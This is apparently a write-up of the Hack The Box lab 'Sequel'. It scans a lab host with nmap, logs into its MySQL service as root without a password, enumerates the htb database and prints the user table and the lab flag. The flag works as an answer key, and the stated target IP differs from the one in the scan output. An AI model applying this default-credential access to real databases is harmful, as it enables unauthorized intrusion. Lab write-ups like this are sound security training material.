# Sequel
#startingpoint 
#veryeasy 
#mysql 
#mariadb

### Reconnaissance
The first step in any penetration test is to gather information about the target system. In this case, we are trying to identify open ports and services on the target host with the IP address 10.129.193.6. We use the `nmap -p- -sV $TARGET` command with the `-p-` option to scan all possible TCP ports and the `-sV` option to display service version information. The output shows that there are 65534 closed tcp ports (connection refused) and one open port, `mysql`, which is running a MySQL database service.
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-21 14:27 CET
Nmap scan report for 10.129.87.79
Host is up (0.054s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
```

### MYSQL
Since we found that there is a mysql database running we perform a research to check if there is any default credentials.
It seems that the default user could be root, so we try to access by running 

We try to connect to the MySQL database service using the default user (`root`) and the target IP address, the command looks like `mysql -u root -h $TARGET`. The output shows that the host is up and running. Once in we are able to list the databases using the `SHOW DATABASES;` command. We observe that there are four databases: `htb`, `information_schema`, `mysql`, and `performance_schema`
```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0,052 sec)
```
Of the 4 databases the one that catch our attention is htb because it seems like a custom one, so we select it using the `use htb;` command to gain access to its tables. We list the tables in the `htb` database using the `SHOW TABLES;` command. We observe that there are two tables: `config` and `users`.
```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0,055 sec)
```

We select all rows from the `users` table using the `SELECT * FROM users;` command. The output shows that there are four rows, each containing information about a user account.
```
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0,045 sec)
```
We select all rows from the `config` table using the `SELECT * FROM config;` command. The output shows that there are seven rows, each containing information about a configuration setting.
```
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0,060 sec)
```
And we finally have found the flag value.